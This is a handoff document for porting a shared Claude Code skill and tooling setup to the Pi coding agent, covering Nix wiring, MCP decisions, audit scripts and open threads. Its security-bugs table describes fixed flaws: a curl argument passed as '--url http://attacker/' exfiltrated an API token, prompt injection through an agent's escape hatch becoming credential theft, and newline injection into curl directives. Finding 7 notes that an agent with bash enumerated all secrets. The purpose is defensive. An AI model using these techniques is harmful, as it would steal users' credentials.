# Handoff: porting the Claude setup to Pi

**Written**: 2026-10-02, because the session is being retired and the work
continues on another machine.
**Scope**: Pi only. The triage/OmniWM track has its own `HANDOFF.md` in this
directory — do not confuse the two, and do not overwrite it.

> Durable companion: a working journal at
> `~/html-pages/2026-09-22-pi-port-journal/` (Waves I–II, served at
> `localhost:7777/pages/2026-09-22-pi-port-journal/` when the gallery runs).
> It will **not** exist on a new machine — this file is the portable record.

---

## The goal, in one line

Two agents — Claude Code and **Pi** (pi.dev) — share **one** source of
skills, prompts and tooling, so nothing has to be maintained twice.

## Start here on a new machine

```bash
# 1. system config (pi itself comes from the pi-coding-agent brew)
cd ~/src/workspace && homeswitch

# 2. Pi packages -- a manual step by necessity, see "Why not declarative"
pi-bootstrap        # if #105 is merged
# otherwise, by hand:
#   pi install git:github.com/mechanical-orchard/pi-guardrails@v0.15.0
#   pi install npm:pi-intercom
#   pi install npm:pi-subagents
#   pi install git:github.com/mechanical-orchard/momentum-tracker

# 3. link the Momentum skill (Pi cannot auto-discover it; see below)
homeswitch

# 4. confirm
pi list
pi -p "list your skills"     # expect 13 + momentum
sc me                        # expect your Shortcut profile
```

`~/.momentum/credentials` and `~/.config/sops/age/keys.txt` are **not** in
git. Both must exist on the new machine or Momentum and `sc` will fail
(loudly, by design).

---

## How it is wired

| Source of truth | Claude sees it at | Pi sees it at |
|---|---|---|
| `programs/agents/skills/` | `~/.claude/skills` | `~/.pi/agent/skills` |
| `programs/agents/prompts/` | `~/.claude/commands` | `~/.pi/agent/prompts` |

Both resolve to the **same Nix store derivation** — not two copies. Drift is
structurally impossible. Edit once, both change.

`programs/claude/` keeps only what is genuinely Claude-specific:
`settings.json`, `hooks/`, `beep-state`.

Full detail: `programs/agents/README.md`. MCP decisions:
`docs/pi/mcp-porting.md`. Intercom: `docs/pi/intercom-reference.md`.

---

## Shipped and live (all merged)

| PR | What |
|---|---|
| **#68** | skills + prompts shared between both agents |
| **#69** | `sc` CLI replacing the Shortcut MCP server, + security fixes |
| **#84** | removed the Shortcut MCP server (banking the saving) |
| **#100** | Momentum skill for Pi |

**#105 is OPEN**: sub-agents (`pi-subagents`) + the `pi-bootstrap` script.
Verified working; merge it.

### What Pi can do now
- 13 shared skills, 10 prompts — same files as Claude
- `sc` (Shortcut CLI), on PATH for both agents and your shell
- `pi-guardrails` (MO security baseline), `pi-intercom` (agent↔agent
  messaging), `pi-subagents` (delegation + parallel dispatch), `momentum`
- Obsidian vaults need no tooling — plain Markdown in `~/src`, read natively

---

## Decisions already made — do not re-litigate

**Pi has no MCP, by design.** Its docs say so outright: *"No MCP. Build CLI
tools with READMEs, or build an extension that adds MCP support."* So the
port was never a config translation.

The rule that fell out of it:

> **Plain API + token → CLI + skill. OAuth service → keep MCP. Plain files →
> nothing at all.**

| Service | Decision | Why |
|---|---|---|
| shortcut | ✅ `sc` CLI | plain REST, token in sops. Replaced 45 MCP tool definitions (~11k–29k tokens **per request**) |
| MCP_DOCKER | ✅ nothing needed | it serves Obsidian; vaults are plain files Pi reads natively. All 20 tools redundant |
| notion | ❌ must stay MCP | OAuth only — returns 401, no token exists |
| slack | ❌ must stay MCP | OAuth; its server advertises `registration_endpoint: null` |
| playwright | ⏸️ parked | browser lifecycle is real work; user's note: *"Claude should be able to use the playwright CLI, if anything. Low priority."* |
| agent-mail | ⏸️ ignored | user's instruction |

**Claude's OAuth sessions live in the macOS Keychain**, not a file, so they
cannot be handed to Pi. Notion/Slack in Pi need `pi-mcp-adapter` plus a fresh
browser sign-in by the user.

**Intercom was not built.** `npm:pi-intercom` already existed; adopting it
cost nothing and gained `ask`/`reply`, `pending`, `cancel`, an Alt+M overlay.

**`pi-subagents` chosen from eight competing npm packages** because it shares
an author with `pi-intercom` and the two integrate (`contact_supervisor`
lets a child message its parent), and its agent format is a superset of
Claude's `.claude/agents/*.md`.

---

## Hard-won findings a naive change would re-break

**1. Pi silently skips a skill with no YAML frontmatter.** Claude tolerates
it; Pi does not — no warning, the skill is simply absent. The `nelson` skill
hit this and was invisible in Pi while working in Claude. Audit:

```bash
for d in programs/agents/skills/*/; do
  head -1 "$d/SKILL.md" | grep -q '^---$' || echo "NO FRONTMATTER: $(basename $d)"
done
```

**2. A skill loading ≠ a skill working.** Anything referencing `mcp__*`,
`Task tool` or `TeammateTool` loads cleanly in Pi and then tells the model to
use tools that do not exist. Two audits, both should print nothing:

```bash
grep -rln 'TeammateTool\|Task tool\|subagent_type\|EnterPlanMode' programs/agents/ --exclude=README.md
grep -rln 'mcp__' programs/agents/ --exclude=README.md
```

**3. Momentum needs a symlink.** Its repo keeps the skill at
`plugins/momentum/skills/momentum`, not a top-level `skills/`, and ships no
`pi` manifest — so Pi's auto-discovery misses it.
`home.activation.linkMomentumSkillForPi` handles it. **Do not** point that at
Claude's plugin cache instead: the path embeds the plugin version
(`.../momentum/0.23.1/`) and old versions are orphaned on upgrade, so it
breaks silently on the next bump.

**4. Test auto-discovery, not `--skill`.** Explicit `--skill` flags prove
format compatibility only. Real sessions pass no flags. Replicate the built
generation into a temp `HOME` and run plain `pi`.

**5. `nix build` ≠ activation.** Building proves the derivation; only
`homeswitch` changes the machine. Activation replaces the **whole** home
generation, so running it from a branch cut from an older main will revert
another track's unmerged work.

**6. Pi writes its own `~/.pi/agent/` state.** `settings.json`, `auth.json`,
`trust.json`, `models-store.json` — symlinking any of them read-only into the
Nix store makes Pi fail on write (the `EACCES` trap already documented for
Claude plugins). Leave them unmanaged.

**7. Any agent with `bash` already has every secret.** Verified:
`pi --tools bash` running `hm-secrets list` enumerated the keys. So
per-agent access is **not** enforceable by config. `--tools`/`--exclude-tools`
genuinely remove tools from the model's list, but they hide a capability
without protecting the credential behind it. For real separation use distinct
profiles (`HOME` / `--session-dir` / project-local `.pi/`) and `nono` for
anything untrusted.

### Security bugs found in `sc` (all fixed — do not reintroduce)

| Bug | Why it mattered |
|---|---|
| token passed via `curl -H` | **world-readable through `ps`** during every request. Now piped over stdin with `curl --config -` |
| `sc raw` forwarded `"$@"` to curl | `--url http://attacker/` **exfiltrated the token**; `-X PUT` turned reads into writes; `--output` wrote arbitrary files. `sc raw` was documented to agents as an escape hatch, so prompt injection became credential theft. Now takes only a JSON body, validates method and path, and passes the URL after `--` |
| non-2xx exited 0 | an agent would read `{"message":"Resource not found."}` as data |
| token with a newline | injected further curl directives (confirmed redirecting to example.com). Now rejected |
| `chmod` followed symlinks | guarded |

---

## Open threads

| Thread | State | Next step |
|---|---|---|
| **#105** | open, verified | merge it |
| **Superpowers** | investigated, not installed | `pi install git:github.com/obra/superpowers` — it is already an official Pi package (top-level `skills/`, `keywords: ["pi-package"]`, a `pi` manifest declaring skills **and** an extension). 15 skills; only 4 ever invoked (`brainstorming` ×8, `systematic-debugging` ×2, `writing-plans`, `subagent-driven-development`). `brainstorming` verified portable. Sub-agent dependency now satisfied by #105 |
| **Notion + Slack in Pi** | blocked on the user | `pi install npm:pi-mcp-adapter` (v3.3.0) reads the same `mcpServers` schema as Claude, so the `jq` patches in `programs/sops/default.nix` port nearly verbatim to `~/.pi/agent/mcp.json`. Needs a browser OAuth sign-in |
| **The lint workflow** | half-written, 3 bugs found | The user was mid-task on `.github/workflows/lint-agents.yml` when an API outage interrupted. Its script had: `grep -o` exiting 1 on no match (kills `set -e` **silently** — the reported symptom); `prompts/*.md` missing `review-pr`, which has no extension; and a raw `{{`/`}}` count that false-positives on JSON in `yesterday.md`. A corrected version was verified in conversation but **never written to a file** |
| `agent-swarm` in `~/.claude/skills` | stale | a real directory from Feb, not nix-managed, Claude-only. Harmless; delete if it annoys |
| Playwright CLI + skill | user's idea, low priority | parked |

---

## Working style that this user asked for

- **Evidence over assertion.** Run the command, show the output. "I checked"
  is not a result.
- **Separate PRs per concern.** The user explicitly split the skills move
  from the MCP/tooling work; keep that discipline.
- **Rebase a stacked PR onto its own base, not main.** Rebasing #84 onto main
  instead of #69's branch manufactured 26 phantom conflicts.
- **Ask before changing live config or installing third-party code.** The
  user has consistently wanted to approve those, and has been right to.
- **Do not run `homeswitch` while another track is mid-test.** Check for
  parallel work first.
- The user juggles several tracks and said tracking the decisions was hard —
  that is why the working journal exists. Keep using it.

## Environment notes

- Pi version moves fast: **0.85.1 → 0.87.1 → 0.99.2 within days**, by design
  (`autoUpdate`/`upgrade` on the homebrew-core brew). Version-specific
  findings here may have drifted; re-verify against the installed version.
- CI on this repo is **red for a pre-existing reason** — `flake.nix:62` needs
  `--impure`, which the macOS job omits. `main` fails identically. The user
  said to ignore it and rely on local builds.
- Local build (never activates, safe alongside other tracks):
  ```bash
  nix build --impure --no-link --print-out-paths \
    '.#darwinConfigurations.darwin.config.home-manager.users.mohib.home.activationPackage'
  ```
